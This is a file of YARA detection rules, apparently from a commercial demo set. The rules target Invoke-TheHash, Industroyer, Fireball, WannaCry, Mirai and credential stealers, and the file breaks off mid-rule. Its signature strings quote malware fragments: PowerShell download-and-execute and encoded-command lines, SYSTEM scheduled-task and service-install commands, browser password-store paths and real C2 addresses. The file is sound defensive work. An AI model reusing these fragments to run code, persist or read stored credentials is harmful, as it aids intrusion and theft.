rule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT T1064 T1136 {
   meta:
      description = "Detects Invoke-WmiExec or Invoke-SmbExec"
      author = "Florian Roth"
      reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
      date = "2017-06-14 11:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke-WMIExec " ascii
      $x2 = "$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))" fullword ascii
      $s1 = "Import-Module $PWD\\Invoke-TheHash.ps1" fullword ascii
      $s2 = "Import-Module $PWD\\Invoke-SMBClient.ps1" fullword ascii
      $s3 = "$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList" fullword ascii
      $x4 = "Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0" ascii
   condition: 
      1 of them
} 

rule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1"
      author = "Florian Roth"
      reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
      date = "2017-06-14 14:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$process_ID = $process_ID -replace \"-00-00\",\"\"" fullword ascii
      $s2 = "Write-Output \"$Target did not respond\"" fullword ascii
      $s3 = "[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)" fullword ascii
   condition: 
      all of them
} 

rule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1"
      author = "Florian Roth"
      reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
      date = "2017-06-14 10:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)" fullword ascii
      $s2 = "$client_challenge = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})" fullword ascii
      $s3 = "$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}" fullword ascii
   condition: 
      all of them
} 

rule Industroyer_Portscan_3_Output_RID32E4 : APT DEMO T1136 {
   meta:
      description = "Detects Industroyer related custom port scaner output file"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 14:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WSA library load complite." fullword ascii
      $s2 = "Connection refused" fullword ascii
   condition: 
      all of them
} 

rule Industroyer_Malware_1_RID2F71 : APT DEMO EXE FILE MAL T1050 T1136 {
   meta:
      description = "Detects Industroyer related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 11:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "haslo.exe" fullword ascii
      $s2 = "SYSTEM\\CurrentControlSet\\Services\\%ls" fullword wide
      $s3 = "SYS_BASCON.COM" fullword wide
      $s4 = "*.pcmt" fullword wide
      $s5 = "*.pcmi" fullword wide
      $x1 = { 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73
         00 5C 00 25 00 6C 00 73 00 00 00 49 00 6D 00 61
         00 67 00 65 00 50 00 61 00 74 00 68 00 00 00 43
         00 3A 00 5C 00 00 00 44 00 3A 00 5C 00 00 00 45
         00 3A 00 5C 00 00 00 } 
      $x2 = "haslo.dat\x00Crash" 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 2 of them )
} 

rule Industroyer_Malware_2_RID2F72 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Industroyer related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 11:57:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "sc create %ls type= own start= auto error= ignore binpath= \"%ls\" displayname= \"%ls\"" fullword wide
      $x2 = "10.15.1.69:3128" fullword wide
      $s1 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)" fullword wide
      $s2 = "/c sc stop %s" fullword wide
      $s3 = "sc start %ls" fullword wide
      $s4 = "93.115.27.57" fullword wide
      $s5 = "5.39.218.152" fullword wide
      $s6 = "tierexe" fullword wide
      $s7 = "comsys" fullword wide
      $s8 = "195.16.88.6" fullword wide
      $s9 = "TieringService" fullword wide
      $a1 = "TEMP\x00\x00DEF" fullword wide
      $a2 = "TEMP\x00\x00DEF-C" fullword wide
      $a3 = "TEMP\x00\x00DEF-WS" fullword wide
      $a4 = "TEMP\x00\x00DEF-EP" fullword wide
      $a5 = "TEMP\x00\x00DC-2-TEMP" fullword wide
      $a6 = "TEMP\x00\x00DC-2" fullword wide
      $a7 = "TEMP\x00\x00CES-McA-TEMP" fullword wide
      $a8 = "TEMP\x00\x00SRV_WSUS" fullword wide
      $a9 = "TEMP\x00\x00SRV_DC-2" fullword wide
      $a10 = "TEMP\x00\x00SCE-WSUS01" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 3 of them or 1 of ( $a* ) ) or ( 5 of them )
} 

rule Industroyer_Portscan_3_RID2FF4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Industroyer related custom port scaner"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 12:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "!ZBfamily" fullword ascii
      $s2 = ":g/outddomo;" fullword ascii
      $s3 = "GHIJKLMNOTST" fullword ascii
      $d1 = "Error params Arguments!!!" fullword wide
      $d2 = "^(.+?.exe).*\\s+-ip\\s*=\\s*(.+)\\s+-ports\\s*=\\s*(.+)$" fullword wide
      $d3 = "Exhample:App.exe -ip= 127.0.0.1-100," fullword wide
      $d4 = "Error IP Range %ls - %ls" fullword wide
      $d5 = "Can't closesocket." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) or 2 of ( $d* ) )
} 

rule Industroyer_Malware_4_RID2F74 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Industroyer related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 11:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "haslo.dat" fullword wide
      $s2 = "defragsvc" fullword ascii
      $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or $a1 )
} 

rule Industroyer_Malware_5_RID2F75 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Industroyer related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/x81cSy"
      date = "2017-06-13 11:58:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "D2MultiCommService.exe" fullword ascii
      $x2 = "Crash104.dll" fullword ascii
      $x3 = "iec104.log" fullword ascii
      $x4 = "IEC-104 client: ip=%s; port=%s; ASDU=%u " fullword ascii
      $s1 = "Error while getaddrinfo executing: %d" fullword ascii
      $s2 = "return info-Remote command" fullword ascii
      $s3 = "Error killing process ..." fullword ascii
      $s4 = "stop_comm_service_name" fullword ascii
      $s5 = "*1* Data exchange: Send: %d (%s)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of them ) ) or ( all of them )
} 

rule CredentialStealer_Generic_Backdoor_RID347C : DEMO EXE FILE GEN MAL T1003 T1136 {
   meta:
      description = "Detects credential stealer byed on many strings that indicate password store access"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-07 15:32:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetOperaLoginData" fullword ascii
      $s2 = "GetInternetExplorerCredentialsPasswords" fullword ascii
      $s3 = "%s\\Opera Software\\Opera Stable\\Login Data" fullword ascii
      $s4 = "select *  from moz_logins" fullword ascii
      $s5 = "%s\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s6 = "Host.dll.Windows" fullword ascii
      $s7 = "GetInternetExplorerVaultPasswords" fullword ascii
      $s8 = "GetWindowsLiveMessengerPasswords" fullword ascii
      $s9 = "%s\\Chromium\\User Data\\Default\\Login Data" fullword ascii
      $s10 = "%s\\Opera\\Opera\\profile\\wand.dat" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 4 of them )
} 

rule Beacon_K5om_RID2B14 : APT DEMO EXE FILE T1105 T1136 {
   meta:
      description = "Detects Meterpreter Beacon - file K5om.dll"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
      date = "2017-06-07 08:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $x2 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $x3 = "%d is an x86 process (can't inject x64 content)" fullword ascii
      $s1 = "Could not open process token: %d (%u)" fullword ascii
      $s2 = "0fd00b.dll" fullword ascii
      $s3 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
      $s4 = "Could not connect to pipe (%s): %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them ) )
} 

rule Backdoor_Redosdru_Jun17_RID2FD1 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware Redosdru - file systemHome.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/OOB3mH"
      date = "2017-06-04 12:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\%d.gho" fullword ascii
      $x2 = "%s\\nt%s.dll" fullword ascii
      $x3 = "baijinUPdate" fullword ascii
      $s1 = "RegQueryValueEx(Svchost\\netsvcs)" fullword ascii
      $s2 = "serviceone" fullword ascii
      $s3 = "\x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#p \x1f#f \x1f#" fullword ascii
      $s4 = "servicetwo" fullword ascii
      $s5 = "UpdateCrc" fullword ascii
      $s6 = "\x1f#[ \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#x \x1f#" fullword ascii
      $s7 = "nwsaPAgEnT" fullword ascii
      $s8 = "%-24s %-15s 0x%x(%d) " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or 4 of them )
} 

rule Backdoor_Nitol_Jun17_RID2E8F : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware backdoor Nitol - file wyawou.exe - Attention: this rule also matches on Upatre Downloader"
      author = "Florian Roth"
      reference = "https://goo.gl/OOB3mH"
      date = "2017-06-04 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)" fullword ascii
      $x2 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)" fullword ascii
      $x3 = "TCPConnectFloodThread.target = %s" fullword ascii
      $s1 = "\\Program Files\\Internet Explorer\\iexplore.exe" fullword ascii
      $s2 = "%c%c%c%c%c%c.exe" fullword ascii
      $s3 = "GET %s%s HTTP/1.1" fullword ascii
      $s4 = "CCAttack.target = %s" fullword ascii
      $s5 = "Accept-Language: zh-cn" fullword ascii
      $s6 = "jdfwkey" fullword ascii
      $s7 = "hackqz.f3322.org:8880" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) or ( all of them )
} 

rule Fireball_de_svr_RID2D14 : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Detects Fireball malware - file de_svr.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 10:16:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd.exe /c MD " fullword ascii
      $s2 = "rundll32.exe \"%s\",%s" fullword wide
      $s3 = "http://d12zpbetgs1pco.cloudfront.net/Weatherapi/shell" fullword wide
      $s4 = "C:\\v3\\exe\\de_svr_inst.pdb" fullword ascii
      $s5 = "Internet Connect Failed!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them )
} 

rule Fireball_lancer_RID2D06 : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Detects Fireball malware - file lancer.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 10:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\instlsp\\Release\\Lancer.pdb" ascii
      $x2 = "lanceruse.dat" fullword wide
      $s1 = "Lancer.dll" fullword ascii
      $s2 = "RunDll32.exe \"" fullword wide
      $s3 = "Micr.dll" fullword wide
      $s4 = "AG64.dll" fullword wide
      $s5 = "\",Start" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )
} 

rule QQBrowser_RID2A97 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Not malware but suspicious browser - file QQBrowser_RID2A97.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 07:03:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "TerminateProcessWithoutDump" fullword ascii
      $s2 = ".Downloader.dll" fullword wide
      $s3 = "Software\\Chromium\\BrowserCrashDumpAttempts" fullword wide
      $s4 = "QQBrowser_RID2A97_Broker.exe" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule chrome_elf_RID2B25 : APT DEMO EXE FILE T1053 T1085 T1136 {
   meta:
      description = "Detects Fireball malware - file chrome_elf_RID2B25.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 08:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1053, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "schtasks /Create /SC HOURLY /MO %d /ST 00:%02d:00 /TN \"%s\" /TR \"%s\" /RU \"SYSTEM\"" fullword wide
      $s6 = "aHR0cDovL2R2Mm0xdXVtbnNndHUuY2xvdWRmcm9udC5uZXQvdjQvZ3RnLyVzP2FjdGlvbj12aXNpdC5jaGVsZi5pbnN0YWxs" fullword ascii
      $s7 = "QueryInterface call failed for IExecAction: %x" fullword ascii
      $s10 = "%s %s,Rundll32_Do %s" fullword wide
      $s13 = "Failed to create an instance of ITaskService: %x" fullword ascii
      $s16 = "Rundll32_Do" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )
} 

rule Fireball_regkey_RID2D18 : APT DEMO EXE FILE T1113 T1136 {
   meta:
      description = "Detects Fireball malware - file regkey.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 10:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1113, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\WinMain\\Release\\WinMain.pdb" fullword ascii
      $s2 = "ScreenShot" fullword wide
      $s3 = "WINMAIN" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule Fireball_winsap_RID2D23 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Fireball malware - file winsap.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 10:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "aHR0cDovL2" ascii
      $s2 = "%s\\svchost.exe -k %s" fullword wide
      $s3 = "\\SETUP.dll" fullword wide
      $s4 = "WinSAP.dll" fullword ascii
      $s5 = "Error %u in WinHttpQueryDataAvailable." fullword ascii
      $s6 = "UPDATE OVERWRITE" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )
} 

rule Fireball_archer_RID2D06 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Fireball malware - file archer.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 10:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\archer_lyl\\Release\\Archer_Input.pdb" fullword ascii
      $s1 = "Archer_Input.dll" fullword ascii
      $s2 = "InstallArcherSvc" fullword ascii
      $s3 = "%s_%08X" fullword wide
      $s4 = "d\\\\.\\PhysicalDrive%d" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $x1 or 3 of them )
} 

rule clearlog_RID2A5A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Fireball malware - file clearlog_RID2A5A.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 05:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\ClearLog\\Release\\logC.pdb" ascii
      $s1 = "C:\\Windows\\System32\\cmd.exe /c \"\"" fullword wide
      $s2 = "logC.dll" fullword ascii
      $s3 = "hhhhh.exe" fullword wide
      $s4 = "ttttt.exe" fullword wide
      $s5 = "Logger Name:" fullword ascii
      $s6 = "cle.log.1" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 or 2 of them )
} 

rule Fireball_gubed_RID2C98 : APT DEMO EXE FILE T1136 T1183 {
   meta:
      description = "Detects Fireball malware - file gubed.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/4pTkGQ"
      date = "2017-06-02 09:55:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136, T1183"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MRT.exe" fullword wide
      $x2 = "tIphlpapi.dll" fullword wide
      $x3 = "http://%s/provide?clients=%s&reqs=visit.startload" fullword wide
      $x4 = "\\Gubed\\Release\\Gubed.pdb" fullword ascii
      $x5 = "d2hrpnfyb3wv3k.cloudfront.net" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule TA459_Malware_May17_1_RID2DEE : DEMO FILE G0062 MAL T1136 {
   meta:
      description = "Detects TA459 related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/RLf9qU"
      date = "2017-05-31 10:52:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0062, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "xtsewy" fullword ascii
      $s6 = "CW&mhAklnfVULL" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6152 and filesize < 800KB and all of them )
} 

rule TA459_Malware_May17_2_RID2DEF : DEMO EXE FILE G0062 MAL T1136 {
   meta:
      description = "Detects TA459 related malware"
      author = "Florian Roth"
      reference = "https://goo.gl/RLf9qU"
      date = "2017-05-31 10:53:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0062, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "Mcutil.dll" fullword ascii
      $a2 = "mcut.exe" fullword ascii
      $s1 = "Software\\WinRAR SFX" fullword ascii
      $s2 = "AYou may need to run this self-extracting archive as administrator" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of ( $a* ) and 1 of ( $s* ) )
} 

rule EternalRocks_taskhost_FR_RID30A5 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects EternalRocks Malware - file taskhost.exe"
      author = "Florian Roth"
      reference = "https://twitter.com/stamparm/status/864865144748298242"
      date = "2017-05-18 12:48:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "EternalRocks.exe" fullword wide
      $s1 = "sTargetIP" fullword ascii
      $s2 = "SERVER_2008R2_SP0" fullword ascii
      $s3 = "20D5CCEE9C91A1E61F72F46FA117B93FB006DB51" fullword ascii
      $s4 = "9EBF75119B8FC7733F77B06378F9E735D34664F6" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of ( $x* ) or 3 of them )
} 

rule EternalRocks_svchost_FR_RID303E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects EternalRocks Malware - file taskhost.exe"
      author = "Florian Roth"
      reference = "https://twitter.com/stamparm/status/864865144748298242"
      date = "2017-05-18 12:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WczTkaJphruMyBOQmGuNRtSNTLEs" fullword ascii
      $s2 = "svchost.taskhost.exe" fullword ascii
      $s3 = "ConfuserEx v" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them )
} 

rule Docm_in_PDF_RID2B03 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects an embedded DOCM in PDF combined with OpenAction"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-15 08:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "2.2.0"
      
   strings:
      $a1 = /<<\/Names\[\([\w]{1,12}.docm\)/ ascii
      $a2 = "OpenAction" ascii fullword
      $a3 = "JavaScript" ascii fullword
   condition: 
      uint32 ( 0 ) == 0x46445025 and all of them
} 

rule WannCry_m_vbs_RID2C49 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects WannaCry Ransomware VBS"
      author = "Florian Roth"
      reference = "https://goo.gl/HG2j5T"
      date = "2017-05-12 09:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".TargetPath = \"C:\\@" ascii
      $x2 = ".CreateShortcut(\"C:\\@" ascii
      $s3 = " = WScript.CreateObject(\"WScript.Shell\")" ascii
   condition: 
      ( uint16 ( 0 ) == 0x4553 and filesize < 1KB and all of them )
} 

rule WannaCry_RansomNote_RID2E99 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects WannaCry Ransomware Note"
      author = "Florian Roth"
      reference = "https://goo.gl/HG2j5T"
      date = "2017-05-12 11:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "A:  Don't worry about decryption." fullword ascii
      $s2 = "Q:  What's wrong with my files?" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3a51 and filesize < 2KB and all of them )
} 

rule Mirai_1_May17_RID2B81 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Mirai Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-12 09:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GET /bins/mirai.x86 HTTP/1.0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and all of them )
} 

rule WannaCry_Ransomware_Gen_RID302B : CRIME DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Detects WannaCry Ransomware"
      author = "Florian Roth (based on rule by US CERT)"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-132A"
      date = "2017-05-12 12:28:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "__TREEID__PLACEHOLDER__" fullword ascii
      $s2 = "__USERID__PLACEHOLDER__" fullword ascii
      $s3 = "Windows for Workgroups 3.1a" fullword ascii
      $s4 = "PC NETWORK PROGRAM 1.0" fullword ascii
      $s5 = "LANMAN1.0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
} 

rule WannCry_BAT_RID2B09 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects WannaCry Ransomware BATCH File"
      author = "Florian Roth"
      reference = "https://goo.gl/HG2j5T"
      date = "2017-05-12 08:49:21"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "@.exe\">> m.vbs" ascii
      $s2 = "cscript.exe //nologo m.vbs" fullword ascii
      $s3 = "echo SET ow = WScript.CreateObject(\"WScript.Shell\")> " ascii
      $s4 = "echo om.Save>> m.vbs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6540 and filesize < 1KB and 1 of them )
} 

rule Miari_2_May17_RID2B82 : DEMO FILE MAL T1136 {
   meta:
